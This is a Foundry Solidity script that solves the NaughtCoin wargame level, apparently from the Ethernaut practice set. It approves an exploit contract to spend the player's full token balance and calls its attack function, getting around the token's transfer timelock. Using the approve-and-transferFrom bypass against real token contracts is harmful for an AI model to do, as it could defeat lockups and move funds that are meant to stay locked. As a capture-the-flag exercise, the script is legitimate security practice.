// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/NaughtCoin.sol";
import "../src/NaughtCoin_exp.sol";
import {Script, console} from "forge-std/Script.sol";

contract NaughtCoinScript is Script {
    NaughtCoin nc;
    NaughCoin_exp nc_exp;
    uint256 deployer;
    function setUp() public {
        // deployer = vm.envUint("ANVIL_PRIVATE_KEY");
        deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);
        // address player = address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
        // address nc_addr = address(0x5FbDB2315678afecb367f032d93F642f64180aa3);

        address player = address(0x3CeE531D7d776D3370484A881bE380dEa317af9e);
        address nc_addr = address(0xd19251185706b0E80124b7FA107956A594A015BF);
        nc = NaughtCoin(nc_addr);
        nc_exp = new NaughCoin_exp();
        uint256 value = nc.balanceOf(player);
        nc.approve(address(nc_exp), value);
        nc_exp.attack(nc_addr, player);
        // console.log("NaughtCoin deployed on %s", address(nc));
        vm.stopBroadcast();
    }

    function run() public {
        
    }
}